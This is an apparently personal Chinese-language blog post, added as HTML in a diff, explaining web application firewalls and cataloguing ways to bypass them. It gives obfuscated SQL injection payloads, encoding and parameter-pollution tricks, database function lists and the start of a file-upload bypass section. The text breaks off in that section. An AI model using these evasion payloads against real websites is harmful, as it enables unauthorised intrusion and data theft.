@@ -1,0 +1,765 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-icon-120x120.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"w01n.github.io","root":"/","scheme":"Pisces","version":"7.7.2","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":true},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Waf &amp;&amp; Bypass">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Waf &amp;&amp; Bypass">
+<meta property="og:url" content="https://w01n.github.io/2020/05/02/Waf-Bypass/index.html">
+<meta property="og:site_name" content="oslo&#39;S Blog">
+<meta property="og:description" content="Waf &amp;&amp; Bypass">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-05-02T02:32:39.000Z">
+<meta property="article:modified_time" content="2020-05-02T02:32:39.000Z">
+<meta property="article:author" content="Oslo">
+<meta property="article:tag" content="Bypass">
+<meta property="article:tag" content="Recording">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://w01n.github.io/2020/05/02/Waf-Bypass/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true
+  };
+</script>
+
+  <title>Waf && Bypass | oslo'S Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="oslo'S Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">oslo'S Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">Self Recording</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签<span class="badge">9</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类<span class="badge">7</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档<span class="badge">7</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://w01n.github.io/2020/05/02/Waf-Bypass/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Oslo">
+      <meta itemprop="description" content="You guilty , You died">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="oslo'S Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Waf && Bypass
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-05-02 10:32:39" itemprop="dateCreated datePublished" datetime="2020-05-02T10:32:39+08:00">2020-05-02</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration/" itemprop="url" rel="index"><span itemprop="name">Penetration</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>10k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>9 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Waf-amp-amp-Bypass"><a href="#Waf-amp-amp-Bypass" class="headerlink" title="Waf &amp;&amp; Bypass"></a>Waf &amp;&amp; Bypass</h1><a id="more"></a>
+
+<h2 id="Waf-Web-Application-Firewall"><a href="#Waf-Web-Application-Firewall" class="headerlink" title="Waf(Web Application Firewall)"></a>Waf(Web Application Firewall)</h2><p><strong>Web应用防火墙</strong> 它又有什么功能 为什么要部署它来保护我们的web网站？</p>
+<p>简单来说，waf可以发现和拦截各类Web层面的攻击，记录攻击日志，实时预警提醒，在web应用本身存在缺陷的情况下保障网站一端的安全，但如果被绕过，也可以后续对服务器进行攻击和入侵</p>
+<p>而waf的<strong>工作流程</strong>分为四个部分</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.预处理：</span><br><span class="line">预处理阶段首先在接收到数据请求流量时会先判断是否为HTTP&#x2F;HTTPS请求，之后会查看此URL请求是否在白名单之内，如果该URL请求在白名单列表里，直接交给后端Web服务器进行响应处理，对于不在白名单之内的对数据包解析后进入到规则检测部分</span><br><span class="line">2.规则检测：</span><br><span class="line">每一种WAF产品都有自己独特的检测规则体系，解析后的数据包会进入到检测体系中进行规则匹配，检查该数据请求是否符合规则，识别出恶意攻击行为</span><br><span class="line">3.处理模块：</span><br><span class="line">针对不同的检测结果，处理模块会做出不同的安全防御动作，如果符合规则则交给后端Web服务器进行响应处理，对于不符合规则的请求会执行相关的阻断、记录、告警处理</span><br><span class="line">(ps：不同的waf产品会有不同的拦截警告页面，平时要注意一点拦截页面，如果在后续渗透中再次碰到，就可以节省时间有目的性的针对waf特性来进行绕过)</span><br><span class="line">4.日志记录：</span><br><span class="line">WAF在处理的过程中也会将拦截处理的日志记录下来，方便管理员在后续中可以进行日志查看分析，从而来达到强化防御</span><br></pre></td></tr></table></figure>
+
+<p><strong>WAF的分类</strong></p>
+<p>1.软WAF</p>
+<p>这种waf以纯软件的形式实现，直接安装到服务器即可，傻瓜式操作，也可以自己配置一些特殊需要的规则在上面</p>
+<p>一般常见的有：云锁，D盾，safedog，天融信的waf，锦衣盾…等等</p>
+<p>2.硬WAF</p>
+<p>硬件WAF的价格一般比较昂贵，支持多种方式部署到Web服务器前端，识别外部的异常流量，并进行阻断拦截，为Web应用提供安全防护</p>
+<p>硬件型WAF以一个独立的硬件设备的形态存在，支持以多种方式（如透明桥接模式、旁路模式、反向代理等）部署到网络中为后端的Web应用提供安全防护，是最为传统的WAF型态，这类产品的优点是性能好、功能全面、支持多种模式部署</p>
+<p>一般常见的：绿盟，安恒，启明星，Imperva、天清WAG…</p>
+<p>3.云WAF</p>
+<p>云WAF的维护成本低，不需要部署任何硬件设备，云WAF的拦截规则会实时更新。对于部署了云WAF的网站，我们发出的数据请求首先会经过云WAF节点进行规则检测，如果请求匹配到WAF拦截规则，则会被WAF进行拦截处理，对于正常、安全的请求则转发到真实Web服务器中进行响应处理</p>
+<p>现在常见的：阿里云waf，腾讯云waf，深信服云waf，Imperva WAF…</p>
+<p>4.自定义WAF</p>
+<p>这类waf就是开发人员或者管理人员自己写的防护规则，比如过滤敏感字符，对字符进行编码转义等，做统一处理</p>
+<p>但是相应的安全性就降低了</p>
+<p><strong>WAF的四种部署方式</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.透明网桥</span><br><span class="line">2.反向代理</span><br><span class="line">3.镜像流量</span><br><span class="line">4.路由代理</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>我们在进行渗透时，是对服务器端发出恶意请求，而服务器处理我们发出的恶意请求不是服务器拥有者想看到的，因为我们可以窃取一些隐私数据和文件，甚至直接控制他的服务器获取权限，不管服务器里面存储着什么，将不再是他一个人的隐私数据</p>
+<p>所以他会部署waf来警告拦截我们的恶意请求，让他的服务器只接收他想服务器接收并处理的请求</p>
+<p>那么黑客会因为waf而收手吗 不会 耶稣都劝不住一个能绕过waf的黑客 我话噶</p>
+<p>所以就需要bypass 让waf认为我发送的是一个正常请求 实际上是一个披着羊皮的狼</p>
+<p>过了waf之后 到了服务器 脱下羊皮 就可以进行针对服务器的恶意操作了</p>
+<p>我这里也是记录一下我所学到的一些关于bypass的知识和骚姿势</p>
+<p>先来了解一下关于bypass可以从那几个方面下手</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.web容器的特性</span><br><span class="line">2.web应用层的问题</span><br><span class="line">3.waf自身的特性和问题</span><br><span class="line">4.数据库的一些特性和遗留漏洞</span><br></pre></td></tr></table></figure>
+
+<h3 id="web容器特性"><a href="#web容器特性" class="headerlink" title="web容器特性"></a>web容器特性</h3><p>IIS+ASP搭建的环境中，对于URL请求的参数值中的%，如果和后面的字符构成的字符串在URL编码表之外，ASP脚本处理时会将其忽略</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and union select 1,2,3,version()%23 --&gt;正常情况的注入</span><br><span class="line">但是因为waf的存在 过滤了 select关键字 所以这个请求会被拦截</span><br><span class="line">那么加上%呢</span><br><span class="line">?id&#x3D;1&#39;and union sel%ect 1,2,3,version()%23</span><br><span class="line">所以在waf层 获取到的是sel%ect 不是关键字select 所以waf层会当成一个正常请求</span><br><span class="line">过了waf之后 由于IIS处理字符时的特性 sel%ect会被解析成select</span><br><span class="line">所以变成了一个正常的sql语句</span><br><span class="line">(ps：这个特性仅在IIS+ASP asp.net不存在)</span><br></pre></td></tr></table></figure>
+
+<p>然后我们再看Unicode 编码 IIS支持Unicode的编码解析 但waf可能不具备 看具体情况</p>
+<p>所以select——&gt;%u0053elect，s%u00f0lect-&gt;select，s%u0065lect-&gt;select</p>
+<p>还有URL编码、二次URL编码绕过 不一定需要全部编码 编码一个字符或者部分字符</p>
+<p>base64编码，ASCII编码，hex编码等等这些都可以尝试用来绕过</p>
+<p><strong>HTTP参数污染</strong>也可用来bypass 在http请求中参数是可以重复出现的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;123&amp;id&#x3D;456</span><br></pre></td></tr></table></figure>
+
+<p>而waf检查时 会把分开检查或者只检查其中一个</p>
+<p>而且这样请求的结果在asp中会得到123， 456(中间有空格)</p>
+<p>asp.net会得到123,456</p>
+<p>所以我们在构造绕过的时候 可以把一条分成两部分分别使用两次参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and union select&#x2F;&amp;id&#x3D;&#x2F;1,2,3,database()%23</span><br><span class="line">处理后会得到---&gt;id&#x3D;1&#39;and union select &#x2F;,&#x2F;1,2,3,database()%23</span><br></pre></td></tr></table></figure>
+
+<p><strong>畸形HTTP请求</strong>(php+apache)</p>
+<p>当向Web服务器发送畸形的,非RFC2616标准的HTTP请求时, Web服务器出于兼容的目的，会尽可能解析畸形HTTP请求。而如果Web服务器的兼容方式与WAF不一致,则可能会出现绕过的情况</p>
+<p>所以在waf只通过GET或者POST来获取数据包处理的时候 畸形HTTP请求的数据包会被waf忽略来达到绕过</p>
+<h3 id="Web应用层的问题"><a href="#Web应用层的问题" class="headerlink" title="Web应用层的问题"></a>Web应用层的问题</h3><p><strong>多重解码问题</strong></p>
+<p>如果服务器端能够处理经过了多重编码的数据 而waf只能处理编码一次的数据 我们就可以通过多重编码来绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1%2527and%2520%25271%2527&#x3D;%25271</span><br></pre></td></tr></table></figure>
+
+<p>%25解码后是%，%27解码后就是单引号，%20解码后是空格</p>
+<p>就会变成 ?id=1’and ‘1’=’1</p>
+<p><strong>多数据来源问题</strong></p>
+<p>WEB程序可从以下3种途径获取到参数ID的参数值：</p>
+<ol>
+<li>从GET请求中获取ID的参数值；</li>
+<li>如果GET请求中没有ID参数，尝试从POST的ID参数中获取参数值；</li>
+<li>如果GET和POST中都获取不到ID的参数值，那么从Cookies中的ID参数获取参数值</li>
+</ol>
+<p>所以结合起来还可以使用参数污染来达到绕过的目的</p>
+<h3 id="WAF自身的问题"><a href="#WAF自身的问题" class="headerlink" title="WAF自身的问题"></a>WAF自身的问题</h3><p>WAF存在某些机制，不处理和拦截白名单中的请求数据：</p>
+<p>1.指定IP或IP段的数据。<br>2.来自于搜索引擎爬虫的访问数据。<br>3.其他特征的数据</p>
+<p>数据获取方式存在缺陷</p>
+<p>某些WAF无法全面支持GET、POST、Cookie等各类请求包的检测，当GET请求的攻击数据包无法绕过时，转换 成POST可能就绕过去了。或者，POST以 Content-Type: application/x-www-form-urlencoded 无法绕过时，转换成上传包格式的Content-Type: multipart/form-data 就能够绕过去</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Type:multipart&#x2F;form-data;</span><br><span class="line">Content-Type:application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Type: text&#x2F;xml</span><br><span class="line">Content-Type: application&#x2F;json</span><br></pre></td></tr></table></figure>
+
+<h4 id="数据处理不恰当"><a href="#数据处理不恰当" class="headerlink" title="数据处理不恰当"></a>数据处理不恰当</h4><ol>
+<li>%00截断 将 %00 进行URL解码，即是C语言中的NULL字符</li>
+</ol>
+<p>如果WAF对获取到的数据存储和处理不当，那么 %00 解码后会将后面的数据截断，造成后面的数据没有经过检测 然后发送到服务器端进行处理</p>
+<p><strong>数据清洗不恰当</strong></p>
+<p>当攻击者提交的参数值中存在大量干扰数据时，如大量空格、TAB、换行、%0c、注释等，WAF需要对其进行清 洗，筛选出真实的攻击数据进行检测，以提高检查性能，节省资源。</p>
+<p>如果WAF对数据的清洗不恰当，会导致真实的数据被清洗，剩余的数据无法被检测出攻击行为</p>
+<h2 id="Bypass-for-Sqli"><a href="#Bypass-for-Sqli" class="headerlink" title="Bypass for Sqli"></a>Bypass for Sqli</h2><p>渗透时发现一个注入点 但偏偏有waf的时候是最痛苦的  当然痛苦是针对不会饶waf的人来说 对于善于思考骚姿势和思路的人来说 又是一次对自己能力的最佳表演机会</p>
+<p>说到注入 就要知道我们要注的数据库是什么 mysql，mssql，sql server，access等等</p>
+<p>才好知道怎么构造payload和利用数据库特性</p>
+<p><strong>数据库注释</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">--</span><br><span class="line">-- -</span><br><span class="line">--+</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;**&#x2F;</span><br><span class="line">&#x2F;*letmetest*&#x2F;</span><br><span class="line">;%00</span><br><span class="line">&#x2F;*！50000select*&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><strong>数据库空白字符</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SQLite3： 0A 0D 0C 09 20 </span><br><span class="line">MySQL5： 09 0A 0B 0C 0D A0 20 </span><br><span class="line">PosgresSQL： 0A 0D 0C 09 20 </span><br><span class="line">Oracle： 11g 00 0A 0D 0C 09 20 </span><br><span class="line">MSSQL： 01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20</span><br></pre></td></tr></table></figure>
+
+<p><strong>特殊符号</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">+</span><br><span class="line">-</span><br><span class="line">~</span><br><span class="line">反单引号</span><br><span class="line">！</span><br><span class="line">@</span><br><span class="line">括号</span><br><span class="line">单双引号</span><br><span class="line">花括号</span><br><span class="line">emoji表情</span><br><span class="line">&#123;x key&#125;</span><br><span class="line">@&#96;id&#96;</span><br><span class="line">\N</span><br></pre></td></tr></table></figure>
+
+<p><strong>sql函数 &amp;&amp; 关键字</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">MySQL：</span><br><span class="line">union distinct</span><br><span class="line">union distinctrow</span><br><span class="line">procedure analyse()</span><br><span class="line">updatexml()</span><br><span class="line">extracavalue()</span><br><span class="line">exp()</span><br><span class="line">ceil()</span><br><span class="line">atan()</span><br><span class="line">sqrt()</span><br><span class="line">floor()</span><br><span class="line">ceiling()</span><br><span class="line">tan()</span><br><span class="line">rand()</span><br><span class="line">sign()</span><br><span class="line">greatest()</span><br><span class="line">字符串截取函数：</span><br><span class="line">Mid(version(),1,1)</span><br><span class="line">Substr(version(),1,1)</span><br><span class="line">Substring(version(),1,1)</span><br><span class="line">Lpad(version(),1,1)</span><br><span class="line">Rpad(version(),1,1)</span><br><span class="line">Left(version(),1)</span><br><span class="line">reverse(right(reverse(version()),1)</span><br><span class="line">字符串连接函数：</span><br><span class="line">concat(version(),&#39;|&#39;,user());</span><br><span class="line">concat_ws(&#39;|&#39;,1,2,3)</span><br><span class="line">字符转换</span><br><span class="line">Char(49)</span><br><span class="line">Hex(&#39;a&#39;)</span><br><span class="line">Unhex(61)</span><br><span class="line">过滤了逗号的情况下：</span><br><span class="line">(1)limit的逗号：</span><br><span class="line">limit 1 offset 0</span><br><span class="line">(2)字符串截取处的逗号</span><br><span class="line">mid的逗号：</span><br><span class="line">mid(version() from 1 for 1)</span><br><span class="line">(3)union处的逗号：</span><br><span class="line">使用jion进行拼接</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">MSSQL：</span><br><span class="line">IS_SRVROLEMEMBER()</span><br><span class="line">IS_MEMBER()</span><br><span class="line">HAS_DBACCESS()</span><br><span class="line">convert()</span><br><span class="line">col_name()</span><br><span class="line">object_id()</span><br><span class="line">is_srvrolemember()</span><br><span class="line">is_member()</span><br><span class="line">字符串截取函数：</span><br><span class="line">Substring(@@version,1,1)</span><br><span class="line">Left(@@version,1)</span><br><span class="line">Right(@@version,1)</span><br><span class="line">(2)字符串转换函数：</span><br><span class="line">Ascii(&#39;a&#39;) 这里的函数可以在括号之间添加空格的，一些waf过滤不严会导致bypass</span><br><span class="line">Char(&#39;97&#39;)</span><br><span class="line">exec</span><br></pre></td></tr></table></figure>
+
+<p>还有一种情况 就是多个widechar解析为同一个字符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">字母a：</span><br><span class="line">%u0000</span><br><span class="line">%u0041</span><br><span class="line">%u0061</span><br><span class="line">%u00aa</span><br><span class="line">%u00e2</span><br><span class="line">单引号：</span><br><span class="line">%u0027</span><br><span class="line">%u02b9</span><br><span class="line">%u02bc</span><br><span class="line">%u02c8</span><br><span class="line">%u2032</span><br><span class="line">%uff07</span><br><span class="line">%c0%27</span><br><span class="line">%c0%a7</span><br><span class="line">%e0%80%a7</span><br><span class="line">空白符：</span><br><span class="line">%u0020</span><br><span class="line">%uff00</span><br><span class="line">%c0%20</span><br><span class="line">%c0%a0</span><br><span class="line">%e0%80%a0</span><br><span class="line">左括号(：</span><br><span class="line">%u0028</span><br><span class="line">%uff08</span><br><span class="line">%c0%28</span><br><span class="line">%c0%a8</span><br><span class="line">%e0%80%a8</span><br><span class="line">右括号)：</span><br><span class="line">%u0029</span><br><span class="line">%uff09</span><br><span class="line">%c0%29</span><br><span class="line">%c0%a9</span><br><span class="line">%e0%80%a9</span><br></pre></td></tr></table></figure>
+
+<p><strong>编码绕过</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">urlencode</span><br><span class="line">base64</span><br><span class="line">json</span><br><span class="line">binary</span><br><span class="line">querystring</span><br><span class="line">htmlencode</span><br><span class="line">unicode</span><br><span class="line">php serialize</span><br></pre></td></tr></table></figure>
+
+<p>将这些关于数据库的函数或者关键字 以及各种编码 结合上面说的各种bypass的方法</p>
+<p>bypass过程中需要我们不停的fuzz 把能够绕过的fuzz出来 自己分析一波 慢慢积累经验</p>
+<p>一般fuzz的位置：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1）：get 请求处 </span><br><span class="line">2）：header 请求处 </span><br><span class="line">3）：post urlencode 内容处 </span><br><span class="line">4）：post form-data 内容处</span><br></pre></td></tr></table></figure>
+
+<p>fuzz内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1）URL未编码过的0-255字符 </span><br><span class="line">2）URL编码的0-255字符 </span><br><span class="line">3）utf gbk编码的字符</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Bypass-for-Upload"><a href="#Bypass-for-Upload" class="headerlink" title="Bypass for Upload"></a>Bypass for Upload</h2><p>这里记录一下关于上传bypass的一些tips</p>
+<p>上传bypass一般是上传马的时候被拦截 一般的是会检查文件后缀名 甚至有些会检查文件内容</p>
+<p>首先我们需要知道一些详细信息(信息收集部分做好)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">网站编程语言(php、asp、aspx、jsp等)</span><br><span class="line">网站使用什么容器(weblogic、tomcat、jboss等)</span><br><span class="line">系统是什么系统 版本多少</span><br><span class="line">允许上传的类型 前端还是后端验证 fuzz一下是白名单还是黑名单</span><br><span class="line">上传之后文件会不会重命名或者被二次渲染 或者无法解析</span><br></pre></td></tr></table></figure>
+
+<p>一般waf会检查上传的如下几个部分</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">请求的url</span><br><span class="line">Boundary边界</span><br><span class="line">MIME类型</span><br><span class="line">文件扩展名</span><br><span class="line">文件内容</span><br></pre></td></tr></table></figure>
+
